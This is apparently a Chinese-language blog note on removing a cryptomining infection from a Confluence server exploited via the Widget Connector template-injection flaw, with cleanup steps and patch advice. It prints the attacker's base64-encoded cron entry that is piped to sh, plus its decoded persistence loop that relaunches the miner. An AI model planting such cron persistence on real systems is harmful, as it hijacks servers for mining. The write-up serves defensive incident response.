## confluence挖矿病毒

### 一、问题描述

- 安装的confluence的机子,服务器CPU达到100%，服务器进行排查，top发现有不知名进程占用大量CPU，出现很多乱码的进程。kill 进程后，隔了几分钟CPU再次飙高。



### 二、解决办法

#### 1.封掉外网HTTP 端口

- 使用云控制台 安全组 设置80端口不允许访问。或者使用防火墙。

#### 2.查杀进程

- 使用命令：top 查看pid 并使用 kill -9 ‘pid’  
-  查杀完成之后，发现进程一直在启动

#### 3.查看否已经写到计划任务

- 查看定时任务
  - crontab -l    （没有先关信息，想到前面用top看 user 是conference1用户，应该没提权到root）
- 再次查看特定的用户： 
  - crontab -l -u confluence1 查看  （此处的confluence1是前面top看到的不知名进程和乱码进程的启动用户）

```bash
查到了相关的恶意计划任务
[root@test tmp]# crontab -l -u  confluence1
* * * * * echo -n  "KCB3aGlsZSA6IDsgZG8gc2xlZXAgNSA7IGlmICEga2lsbCAtMCAyNTQ0MyA+L2Rldi9udWxsIDI+JjEgOyB0aGVuIC9vcHQvYXRsYXNzaWFuL2NvbmZsdWVuY2UvdGVtcC9kZW5mdHYgPi9kZXYvbnVsbCAyPiYxIDsgZmkgOyBkb25lICkgJiBwaWQ9JCEgOyAoc2xlZXAgMTAgJiYga2lsbCAtOSAkcGlkKSAm" | base64 -d | sh >/dev/null 2>&1
base64 解密为：
( while : ; do sleep 5 ; if ! kill -0 25443 >/dev/null 2>&1 ; then /opt/atlassian/confluence/temp/denftv >/dev/null 2>&1 ; fi ; done ) & pid=$! ; (sleep 10 && kill -9 $pid) &
是一个死循环。

进入相应目录查看，也会发现多了一个confluence目录文件
ll /var/spool/cron/confluence
```

#### 4.杀死定时任务

1. 使用命令：crontab -r -u confluence1
2. 也可以使用：cd /var/spool/cron/confluence;  >confluence  清空防止差生新的进程

- 再次查看是否有新的定时任务生成
  - crontab -l -u confluence1 

#### 5.清除/tmp/下所有confluence1用户创建的目录

- 该目录为病毒文件

#### 6.清除/opt/atlassian/confluence/temp/ 下所有confluence1用户创建的目录

- 应该是攻击confluence 的病毒文件

#### 7.升级confluence

- 安全建议：以下任选一种皆可修复漏洞

  a.升级至安全版本。下载链接：[download](https://www.atlassian.com/software/confluence/download/data-center)

  b升级Widget Connector 组件。下载链接：[download](https://packages.atlassian.com/maven-public/com/atlassian/confluence/extra/widgetconnector/widgetconnector/)

- Linux系统运行如下命令查找widgetconnector-*.jar文件所在位置：

  > find / -name "widgetconnector-*"
  >
  > /opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-5.0.1.jar
  >
  > 下载最新版本的widgetconnector-*.jar替换，并重启Confluence应用

- 选用的是 b 方案 替换 jar 替换目录为 /opt/atlassian/confluence/confluence/WEB-INF/lib

#### 8.检查

- 完成这些后检查/tmp/ 和/opt/atlassian/confluence/temp/  还有crontab -l -u confluence1 是否有新的病毒文件或任务生成，有就再次删除。

#### 9.重启服务器，并再次运行confluence

- 服务器起来查看是否还有confluence1的乱码进程。



### 三、病毒来源：

- 官方发布了预警，于是开始了漏洞应急。漏洞描述中指出Confluence Server与Confluence数据中心中的Widget连接器存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。
- 涉及版本
  - 涉及版本：影响版本6.6.7之前的所有版本的Confluence Server和Confluence数据中心，6.8.5之前的版本6.7.0（6.8.x的固定版本），6.9.3之前的6.9.0版本（6.9的固定版本）

